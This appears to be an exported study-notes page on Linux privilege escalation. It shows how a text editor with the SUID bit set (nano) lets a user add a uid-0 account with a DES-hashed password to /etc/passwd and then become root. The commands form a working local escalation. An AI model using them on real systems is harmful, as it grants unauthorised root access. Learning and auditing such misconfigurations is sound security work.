<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SUID Text Editors</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SUID Text Editors</h1><br/><strong>Find SUID applications</strong><br />SUID → Set User ID<br />Usually a user can execute a file only if he have the permission to execute that particular file.<br />The SUID bit says that any user can execute this particular file with the permissions of the owner.<br /><div class="codebox"><pre>user@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">find</span> <span style="color:#ff9d00;font-weight:700">/</span>* -user root -perm -4000 -print 2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null</pre></div><br />    <a href=""><img src="images/924-1.png" alt="images/924-1.png" /></a><br /><br /><strong>Text editors with the SUID bit enabled</strong><br />Particular attention to <span style="text-decoration:underline;">text editors</span>(Vi, Nano, Leafpad...) that have the SUID bit enabled! that means any user can edit any file on the system<br />if we take as example the file /usr/bin/nano. <br /><div class="codebox"><pre>------chmod u+s <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>nano------     <span style="color:#0088ff;font-weight:400">#add SUID bit to nano</span><br />------chmod u<span style="color:#ffdd00;font-weight:400">-s</span> <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>nano------     <span style="color:#0088ff;font-weight:400">#remove SUID bit from nano</span></pre></div><br /><br /><div class="codebox"><pre>user@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span><br />user@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">ls</span> -l <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> nano</pre></div><br />we can see that the third bit the owner is not set as ‘x’ but as ‘s’ ( this is the SUID bit)<br />This means that anyone who runs the <em>passwd</em> file has the privileges of the root user<br />    <a href=""><img src="images/924-2.png" alt="images/924-2.png" /></a><br />As a privileged user, we can edit for example the passwd file with root privileges using Nano. <br />This means that we can add a new root user to the system by adding a new user record to the passwd file.<br />    <div class="codebox"><pre>user@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ nano <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span></pre></div><br />To look how the record of the passwd file work go to the chapter: <a href="tem_Security_(Windows_&_Linux)--Cryptography_and_Password_Cracking--Authentication--Linux--Where_are_stored_the_passwords_hashes_in_Linux.html">Where are stored the password hashes in Linux</a><br />    <a href=""><img src="images/924-3.png" alt="images/924-3.png" /></a><br />We have to look at the <span style="color:#a020f0;">point 2</span>. This is the password field, but if instead of the password there is a &quot;x&quot; means that the actual password is stored in the /etc/shadow file.<br />Because we have nano text editor with root privileges we can edit the file and add an account with in the password field a cryptographic hash from the password and a salt.<br />To create an hash from password “<span style="color:#1e90ff;">password</span>” and salt “<span style="color:#ff00c5;">sa</span>lt” with <a href="hodology--System_Security_(Windows_&_Linux)--Cryptography_and_Password_Cracking--Authentication--Linux--Hashing_algorithms--DES_algorithm.html">DES</a><a href="hodology--System_Security_(Windows_&_Linux)--Cryptography_and_Password_Cracking--Authentication--Linux--Hashing_algorithms--DES_algorithm.html"> algorithm</a>.<br />If the salt is more of two characters like in this case is <span style="color:#ff00c5;">truncated to two</span>. Then the <span style="color:#ff00c5;">two characters are saved at the start of the hash</span><br />    <div class="codebox"><pre>user@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">perl</span> -e <span style="color:#3ad900;font-weight:400">&#39;print crypt(&quot;password&quot;,&quot;salt&quot;), &quot;\n&quot;&#39;</span>                        <span style="color:#0088ff;font-weight:400">#perl</span><br />user@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ python -c <span style="color:#3ad900;font-weight:400">&#39;import crypt; print crypt.crypt(&quot;password&quot;, &quot;salt&quot;)&#39;</span>       <span style="color:#0088ff;font-weight:400">#python</span></pre></div><br />    <code><span style="color:#ff00c5;">sa</span></code><code><span style="color:#0000ff;">3tHJ3/KuYvI</span></code><br />    * Because we have used the DES algorithm we had not need to specify the algorithm. <br />        For example in the /etc/shadow file the hashes are made with SHA512 and to do that we have to specify it with $6$ like that: <br />        perl -e &#39;print crypt(&quot;password&quot;,&quot;\$6\$salt\$&quot;) . &quot;\n&quot;&#39;<br /><div class="codebox"><pre>user@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ nano <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span></pre></div><br />add this line: <code>myUser:sa3tHJ3/KuYvI:0:0:root:/root:/bin/bash</code><br />    <a href=""><img src="images/924-4.png" alt="images/924-4.png" /></a><br />    Now we can close and save it CTRL+X<br /><div class="codebox"><pre>user@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">su</span> myUser<br />----insert password<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#3ad900;font-weight:400">&quot;password&quot;</span>-------<br />root@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">id</span>                          <span style="color:#0088ff;font-weight:400">#shell with root privileges</span><br />root@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">whoami</span></pre></div><br />	<a href=""><img src="images/924-5.png" alt="images/924-5.png" /></a><br /></div>
</body>
</html>
